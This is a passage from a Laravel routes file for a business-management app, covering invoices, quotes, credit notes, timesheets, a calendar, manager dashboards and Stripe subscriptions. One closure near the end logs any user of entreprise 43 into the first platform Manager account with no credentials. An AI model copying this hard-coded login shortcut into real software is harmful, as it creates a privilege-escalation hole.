    Route::get('/Invoicessrepports/downloadRepports', [projectController::class, 'downloadInvoicesRepports'])->name('Invoicessrepports.downloadRepports');

    Route::get('/Devissrepports/downloadRepports', [projectController::class, 'downloadDevisRepports'])->name('Devissrepports.downloadRepports');

    Route::get('/invoice/creditNote/{id}', [projectController::class, "generateCreditNote"])->name('invoice.creditNote');

    Route::get('/invoice/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('invoice.creditNoteHistory');

    Route::get('/invoices/serveCreditNotePdf/{credit_note_number}', [projectController::class, "serveCreditNotePdf"])->name('invoices.serveCreditNotePdf');

    Route::get('/creditNote/downloadRepports', [projectController::class, 'downloadcreditNoteRepports'])->name('creditNote.downloadRepports');

    Route::delete('/credit_note/{credit_note}/destroy', [projectController::class, "destroyCreditNote"])->name('credit_note.destroy');

    Route::get('/creditNote/creditNoteHistory', [projectController::class, "creditNoteHistory"])->name('creditNote.creditNoteHistory');

    // Detailed Credit Note Routes
    Route::get('/invoice/detailedCreditNote/{id}', [projectController::class, "createDetailedCreditNote"])->name('invoice.detailedCreditNote');
    Route::post('/invoices/confirmDetailedCreditNote/{invoiceID}', [projectController::class, "confirmDetailedCreditNote"])->name('invoices.confirmDetailedCreditNote');

    Route::post('workdaysrepports/updateWorkdaysRepport', [employeesController::class, 'updateWorkdaysRepport'])->name('workdaysrepports.updateWorkdaysRepport');

    Route::get('/workDaysReports/index', [employeesController::class, "workDaysReportsIndex"])->name('workDaysReports.index');

    Route::get('/workDaysReports/filter-reports', [employeesController::class, 'filterReports'])->name('workDaysReports.filterReports');

    Route::get('/workDaysReports/downloadRepports', [employeesController::class, 'downloadworkDaysRepports'])->name('workDaysReports.downloadRepports');

    Route::post('/workDaysReports/nextMonthRepports', [employeesController::class, 'nextMonthRepports'])->name('workDaysReports.nextMonthRepports');

    // New routes for PDF preview and emailing
    Route::get('/workDaysReports/pdf', [employeesController::class, 'generatePdfForPreview'])->name('workDaysReports.pdf');
    Route::post('/workDaysReports/sendEmail', [employeesController::class, 'sendWorkdaysReportEmail'])->name('workDaysReports.sendEmail');

    Route::get('/notedefrais/generateNoteDeFrais', [projectController::class, "generateNoteDeFrais"])->name('notedefrais.generateNoteDeFrais');
    Route::post('/notedefrais/savePdf', [projectController::class, "saveNoteDeFraisPdf"])->name('notedefrais.saveNoteDeFraisPdf');
    Route::get('/notedefrais/parameters', [projectController::class, "notedefraisparameters"])->name('notedefrais.parameters');
    Route::get('/notedefrais/downloadNoteDeFrais/{id}', [projectController::class, "downloadNoteDeFrais"])->name("notedefrais.downloadNoteDeFrais");
    Route::get('/notedefrais/notedefraishistory', [projectController::class, "notedefraishistory"])->name('notedefrais.notedefraishistory');
    Route::delete('/notedefrais/{notedefrais}/destroy', [projectController::class, "destroyNotedeFrais"])->name('notedefrais.destroy');
    Route::get('/notedefrais/downloadRepports', [projectController::class, 'downloadNoteDeFraisRepports'])->name('notedefrais.downloadRepports');

    Route::get('filter/employees/{employeeId}/projects', [ProjectController::class, 'getEmployeeProjects'])->name('filter.getEmployeeProjects');
    Route::get('filter/employees/{employeeId}/tasks', [ProjectController::class, 'getEmployeeTasks'])->name('filter.getEmployeeTasks');
    Route::get('filter/projects/{projectId}/tasks', [ProjectController::class, 'getProjectTasks'])->name('filter.getProjectTasks');
    Route::get('filter/tasks/{taskId}', [ProjectController::class, 'getTaskInfo'])->name('filter.getTaskInfo');
    Route::get('filter/projects', [ProjectController::class, 'getAllProjects'])->name('filter.getAllProjects');
    Route::get('filter/tasks', [ProjectController::class, 'getAllTasks'])->name('filter.getAllTasks');

    Route::get('/projects/partialInvoice/{projectid}/{amount}', [projectController::class, "PartialInvoice"])->name('projects.PartialInvoice');
    Route::get('/projects/percentageInvoice/{projectid}/{percentage}', [projectController::class, "PercentageInvoice"])->name('projects.PercentageInvoice');

    Route::post('/projects/confirm-full-invoice/{projectID}/{budget}/{comment?}', [ProjectController::class, 'confirmFullInvoice'])->name('projects.confirmFullInvoice');

    Route::post('/projects/confirm-period-invoice/{projectID}/{startdate}/{enddate}/{comment?}', [ProjectController::class, 'confirmPeriodInvoice'])->name('projects.confirmPeriodInvoice');
    Route::post('/projects/confirm-percentage-invoice/{projectID}/{percentage}/{comment?}', [ProjectController::class, 'confirmPercentageInvoice'])->name('projects.confirmPercentageInvoice');
    Route::post('/projects/confirm-partial-invoice/{projectID}/{amount}/{comment?}', [ProjectController::class, 'confirmPartialInvoice'])->name('projects.confirmPartialInvoice');

    Route::post('/projects/decline-Invoice', [ProjectController::class, 'declineInvoice'])->name('projects.declineInvoice');

    Route::post('/projects/archive/{project_id}', [ProjectController::class, "archiveProject"])->name('projects.archive');
    Route::post('/projects/unarchive/{project_id}', [ProjectController::class, "unarchiveProject"])->name('projects.unarchive');
    Route::get('projectsArchived/archive', [ProjectController::class, 'projectArchiveIndex'])->name('projectsArchived.archiveIndex');

    Route::post('/devis/archive/{devis_id}', [ProjectController::class, "archiveDevis"])->name('devis.archive');
    Route::post('/devis/unarchive/{devis_id}', [ProjectController::class, "unarchiveDevis"])->name('devis.unarchive');
    Route::get('devisArchived/archive', [ProjectController::class, 'devisArchiveIndex'])->name('devisArchived.archiveIndex');

    Route::post('creditNote/confirm/{id}/{noteType}/{noteAmount}', [ProjectController::class, 'ConfirmCreditNote'])->name('creditNote.confirm');

    Route::post('/confirm-frais-note', [ProjectController::class, 'confirmFraisNote'])->name('notedefrais.confirmFraisNote');

    Route::post('/projects/updateInfos/{id}/{client_id?}', [ProjectController::class, 'update'])->name('projects.updateInfos');

    Route::get('/tasks/{employee}/durationInfos/{task}', [tasksController::class, 'durationInfos'])->name('tasks.durationInfos');

    Route::post('/devis/saveDuplicateDevis', [projectController::class, "saveDuplicateDevis"])->name('devis.saveDuplicateDevis');
    Route::get('/devis/duplicateDevis/{devis_id}', [projectController::class, "duplicateDevis"])->name('devis.duplicateDevis');

    Route::get('/pointage/filterPointageByDate', [tasksController::class, 'filterPointageByDate'])->name('pointage.filterPointageByDate');

    Route::get('/pointage/get-timer-state', [tasksController::class, 'get_timer_state'])->name('pointage.get_timer_state');

    Route::get('/pointage/filter-table', [tasksController::class, 'filterPointageTable'])->name('pointage.filterPointageTable');
    Route::get('invoiceArchived/archive', [ProjectController::class, 'invoiceArchiveIndex'])->name('invoiceArchived.archiveIndex');

    Route::delete('/billing/destroy/{id}', [AdminEntrepriseController::class, 'destroyBillings'])->name('billing.destroy');
    Route::post('/budget/update/{id}', [AdminEntrepriseController::class, 'updateCharge'])->name('budget.updateCharge');

    Route::get('/calendar', [CalendarController::class, 'index'])->name('calendar.index');
    Route::get('/calendar/events', [CalendarController::class, 'getEvents'])->name('calendar.events');
    Route::post('/calendar/events', [CalendarController::class, 'store'])->name('calendar.store');
    Route::put('/calendar/events/{id}', [CalendarController::class, 'update'])->name('calendar.update');
    Route::delete('/calendar/events/{id}', [CalendarController::class, 'destroy'])->name('calendar.destroy');
    Route::patch('/calendar/events/{id}/dates', [CalendarController::class, 'updateDates'])->name('calendar.updateDates');

    Route::get('/calendar/daily-events', [CalendarController::class, 'getDailyEvents'])->name('calendar.dailyEvents');
    Route::get('/calendar/events/current-month', [CalendarController::class, 'getCurrentMonthEvents'])->name('calendar.currentMonthEvents');
    Route::get('/calendar/send-events/preview', [CalendarController::class, 'previewSendEvents'])->name('calendar.send-events.preview');
    Route::get('/calendar/events/pdf', [CalendarController::class, 'generateEventsPDF'])->name('calendar.events.pdf');
    Route::post('/calendar/send-events-email', [CalendarController::class, 'sendEventsEmail'])->name('calendar.send-events-email');

    // Edit Full Invoice routes
    Route::get('/invoices/edit/{id}', [ProjectController::class, 'editFullInvoice'])->name('invoices.editFullInvoice');
    Route::put('/invoices/update/{id}', [ProjectController::class, 'updateFullInvoice'])->name('invoices.updateFullInvoice');

    // Edit Partial Invoice routes
    Route::get('/invoices/partial/edit/{id}', [ProjectController::class, 'editPartialInvoice'])->name('invoices.editPartialInvoice');
    Route::put('/invoices/partial/update/{id}', [ProjectController::class, 'updatePartialInvoice'])->name('invoices.updatePartialInvoice');

    // Edit Percentage Invoice routes
    Route::get('/invoices/percentage/edit/{id}', [ProjectController::class, 'editPercentageInvoice'])->name('invoices.editPercentageInvoice');
    Route::put('/invoices/percentage/update/{id}', [ProjectController::class, 'updatePercentageInvoice'])->name('invoices.updatePercentageInvoice');

    // Edit Period Invoice routes
    Route::get('/invoices/period/edit/{id}', [ProjectController::class, 'editPeriodInvoice'])->name('invoices.editPeriodInvoice');
    Route::put('/invoices/period/update/{id}', [ProjectController::class, 'updatePeriodInvoice'])->name('invoices.updatePeriodInvoice');

    Route::get('/devis/edit/{id}', [projectController::class, 'editDevis'])->name('devis.editDevis');
    Route::put('/devis/update/{id}', [projectController::class, 'updateDevis'])->name('devis.updateDevis');

    Route::post('/projects/{project}/upload-file', [ProjectController::class, 'uploadProjectFile'])->name('projects.uploadFile');
    Route::get('/projects/downloadfiles/{file_name}', [ProjectController::class, 'downloadfiles'])->name('projects.downloadfiles');
    Route::delete('/projects/deletefiles/{file_name}', [ProjectController::class, 'deletefiles'])->name('projects.deletefiles');

    Route::post('/tasks/update-{field}/{id}', [tasksController::class, 'updateField'])->name('tasks.updateField');
    Route::get('/invoices/generate-detailed', [projectController::class, 'generateDetailedInvoice'])->name('invoices.generate.Detailed');
    Route::post('/invoices/detailed', [projectController::class, 'detailedInvoice'])->name('invoices.detailed');
    Route::post('/invoices/confirm-detailed/{projectID}', [projectController::class, 'confirmDetailedInvoice'])->name('invoices.confirmDetailedInvoice');

    Route::post('/employees/archive/{employee_id}', [employeesController::class, "archiveEmployee"])->name('employees.archive');
    Route::post('/employees/unarchive/{employee_id}', [employeesController::class, "unarchiveEmployee"])->name('employees.unarchive');
    Route::get('employeesArchived/archive', [employeesController::class, 'employeeArchiveIndex'])->name('employeesArchived.archiveIndex');

    Route::get('/invoices/editDetailedInvoice/{id}', [ProjectController::class, 'editDetailedInvoice'])->name('invoices.editDetailedInvoice');
    Route::post('/invoices/updateDetailedInvoice/{id}', [ProjectController::class, 'updateDetailedInvoice'])->name('invoices.updateDetailedInvoice');

    // Add this route within your admin group/middleware
    Route::get('/get-devis/{projectId}', [ProjectController::class, 'getDevisByProject'])->name('get.devis.by.project');
    Route::get('/get-devis-comment/{devisId}', [ProjectController::class, 'getDevisComment']);

    Route::get('/tasks/get-project-tasks/{project}', [TasksController::class, 'getProjectTasks']);
    Route::post('/tasks/move-duration', [TasksController::class, 'moveDuration']);
    Route::get('/employees/{employeeId}/projects', [TasksController::class, 'getEmployeeProjects']);
    Route::post('/clients/filterInvoices/{client}', [clientsController::class, 'filterInvoices'])->name('clients.filterInvoices');

    Route::get('/clients/downloadInvoicesRepports/{client}', [clientsController::class, 'downloadInvoicesRepports'])->name('clients.downloadInvoicesRepports');

    Route::get('/filter/all-projects', [TasksController::class, 'getAllProjects']);
    Route::get('/filter/all-tasks', [TasksController::class, 'getAllTasks']);

    // Responsable_de_projet routes for detailed credit note
    Route::get('/invoice/detailedCreditNote/{id}', [projectController::class, "createDetailedCreditNote"])->name('invoice.detailedCreditNote');
    Route::post('/invoices/confirmDetailedCreditNote/{invoiceID}', [projectController::class, "confirmDetailedCreditNote"])->name('invoices.confirmDetailedCreditNote');

    Route::post('/credit_note/send/{credit_note_id}', [ProjectController::class, 'sendCreditNote'])->name('credit_note.send');

    Route::get('/filter/clients/{client}/projects', [tasksController::class, 'getClientProjects'])->name('filter.client.projects');

    Route::get('/invoice/{invoice}/recipients', [ProjectController::class, 'getRecipients']);

    Route::get('/Pointagerepports/downloadMultipleTasksRepports/{startDate}/{endDate}', [tasksController::class, 'downloadMultipleTasksRepports'])->name('Pointagerepports.downloadMultipleTasksRepports');

    Route::post('/employees/send-email', [employeesController::class, 'sendEmail'])->name('employees.send-email');

    Route::get('/devis/get-contacts/{devisId}', [projectController::class, 'getDevisContacts'])->name('devis.getContacts');

        // Update comment on a task timer (owned by the authenticated employee)
        Route::patch('tasks/timers/{id}/comment', [\App\Http\Controllers\employees\tasksController::class, 'updateTimerComment'])->name('tasks.timers.updateComment');

});




// Manager routes (separate guard)
Route::prefix('manager')->name('manager.')->group(function () {
    Route::middleware('guest:manager')->group(function () {
        Route::get('login', [ManagerAuthController::class, 'showLoginForm'])->name('login');
        Route::post('login', [ManagerAuthController::class, 'login'])->name('login.submit');
    });

    Route::middleware('auth:manager')->group(function () {
        Route::post('logout', [ManagerAuthController::class, 'logout'])->name('logout');
        Route::get('dashboard', [ManagerDashboardController::class, 'index'])->name('dashboard');
        Route::get('dashboard/entreprises', [ManagerDashboardController::class, 'entreprises'])->name('dashboard.entreprises');
        Route::get('dashboard/active-subscriptions', [ManagerDashboardController::class, 'activeSubscriptions'])->name('dashboard.active-subscriptions');
        Route::get('dashboard/users', [ManagerDashboardController::class, 'users'])->name('dashboard.users');
        Route::get('dashboard/users/daily-active', [ManagerDashboardController::class, 'dailyActiveUsers'])->name('dashboard.users.daily-active');
        Route::get('dashboard/users/monthly-active', [ManagerDashboardController::class, 'monthlyActiveUsers'])->name('dashboard.users.monthly-active');
        Route::get('dashboard/users/new-signups', [ManagerDashboardController::class, 'newSignupsUsers'])->name('dashboard.users.new-signups');
        Route::get('dashboard/visits/non-client', [ManagerDashboardController::class, 'nonClientVisits'])->name('dashboard.visits.non-client');
        Route::get('dashboard/visits/non-client-unique', [ManagerDashboardController::class, 'uniqueNonClientVisitors'])->name('dashboard.visits.non-client-unique');
        Route::get('dashboard/invoices', [ManagerDashboardController::class, 'invoices'])->name('dashboard.invoices');
        Route::get('subscriptions', [ManagerSubscriptionController::class, 'index'])->name('subscriptions.index');
        Route::get('subscriptions/{entreprise}', [ManagerSubscriptionController::class, 'show'])->name('subscriptions.show');
        Route::get('subscriptions/{entreprise}/invoices/{invoiceId}/download', [ManagerSubscriptionController::class, 'downloadInvoice'])->name('subscriptions.invoices.download');
        Route::post('subscriptions/{entreprise}/invoices/{invoiceId}/send', [ManagerSubscriptionController::class, 'sendInvoice'])->name('subscriptions.invoices.send');
        Route::delete('subscriptions/{entreprise}', [ManagerSubscriptionController::class, 'destroy'])->name('subscriptions.destroy');
        
        // Manager blog routes
        Route::get('blog', [\App\Http\Controllers\manager\ManagerBlogController::class, 'index'])->name('blog.index');
        Route::get('blog/create', [\App\Http\Controllers\manager\ManagerBlogController::class, 'create'])->name('blog.create');
        Route::post('blog', [\App\Http\Controllers\manager\ManagerBlogController::class, 'store'])->name('blog.store');
        Route::get('blog/{post}/edit', [\App\Http\Controllers\manager\ManagerBlogController::class, 'edit'])->name('blog.edit');
        Route::patch('blog/{post}', [\App\Http\Controllers\manager\ManagerBlogController::class, 'update'])->name('blog.update');
        Route::delete('blog/{post}', [\App\Http\Controllers\manager\ManagerBlogController::class, 'destroy'])->name('blog.destroy');
        // Manager profile routes
        Route::get('profile', [\App\Http\Controllers\manager\ManagerProfileController::class, 'index'])->name('profile.index');
        Route::get('profile/edit', [\App\Http\Controllers\manager\ManagerProfileController::class, 'edit'])->name('profile.edit');
        Route::patch('profile', [\App\Http\Controllers\manager\ManagerProfileController::class, 'update'])->name('profile.update');
        Route::patch('profile/password', [\App\Http\Controllers\manager\ManagerProfileController::class, 'updatePassword'])->name('profile.password.update');
    });
});

// Neutral page shown to blocked users who are NOT allowed on the upgrade
// page (e.g. Employees). Reachable by any authenticated user without a role
// restriction so blocked accounts always see a message instead of a 403.
Route::get('/account/blocked', [ProfileController::class, 'blocked'])
    ->middleware(['auth'])
    ->name('account.blocked');

Route::middleware([
    'auth',
    // Employees should not access profile/subscription routes
    'role:Admin|super_admin|SuperAdmin|Responsable de projet|Responsable de projet et gestionnaire',
])->group(function () {
    Route::get('/admin/profile', [ProfileController::class, 'index'])->name('profile');
    Route::get('/profile/upgrade', [ProfileController::class, 'showUpgradePage'])->name('profile.upgrade');

    Route::get('/profile', [ProfileController::class, 'edit'])->name('profile.edit');
    Route::patch('/profile', [ProfileController::class, 'update'])->name('profile.update');
    Route::delete('/profile', [ProfileController::class, 'destroy'])->name('profile.destroy');

    // --- PAYMENT ROUTES ---
    // 1. Start Payment
    Route::get('/choose-plan/{plan}', [SubscriptionController::class, 'choosePlan'])
        ->name('subscription.choose');

    // 2. Payment Success (Handle DB update after Stripe)
    Route::get('/payment/success/{plan}', [SubscriptionController::class, 'paymentSuccess'])
        ->name('subscription.success');

    Route::post('/subscription/renewal-preference', [SubscriptionController::class, 'updateRenewalPreference'])
        ->name('subscription.renewal-preference.update');

    // 3. Cancel current subscription only (no data deletion)
    Route::delete('/subscription/cancel', [SubscriptionController::class, 'cancelSubscription'])
        ->name('subscription.cancel');

    // 4. Cancel subscription (if any) and delete entreprise & all data
    Route::delete('/subscription/cancel-and-delete', [SubscriptionController::class, 'cancelAndDelete'])
        ->name('subscription.cancel-and-delete');

    // Direct, single-click access to the manager dashboard for a specific entreprise (ID 43).
    // This logs in the default platform manager on the manager guard and redirects to the dashboard,
    // but only if the currently authenticated user belongs to entreprise 43.
    Route::get('/manager/direct-dashboard', function () {
        $user = auth()->user();

        if (! $user || (int) ($user->entreprise_id ?? 0) !== 43) {
            abort(403);
        }

        if (auth('manager')->check()) {
            return redirect()->route('manager.dashboard');
        }

        $manager = \App\Models\Manager::first();

        if (! $manager) {
            abort(500, 'Manager account is not configured.');
        }

        auth('manager')->login($manager);

        return redirect()->route('manager.dashboard');
    })->name('manager.direct-dashboard');

    Route::get('/edit-profile', function () {
        return view('profile.edit');
    });
});

Route::post('/stripe/webhook', [StripeWebhookController::class, 'handleWebhook'])
    ->middleware(\Laravel\Cashier\Http\Middleware\VerifyWebhookSignature::class)
    ->name('stripe.webhook');

Route::get('/forgot-password', [PasswordResetLinkController::class, 'create'])->middleware('guest')->name('password.request');

Route::middleware(['auth', 'throttle:30,1'])->group(function () {
    Route::post('/tasks/prepare-stop-comment', [tasksController::class, 'prepareStopComment'])->name('tasks.prepare-stop-comment');
    Route::post('/tasks/correct-comment', [tasksController::class, 'correctComment'])->name('tasks.correct-comment');
    Route::post('/tasks/translate-comment', [tasksController::class, 'translateComment'])->name('tasks.translate-comment');
});

require __DIR__ . '/auth.php';


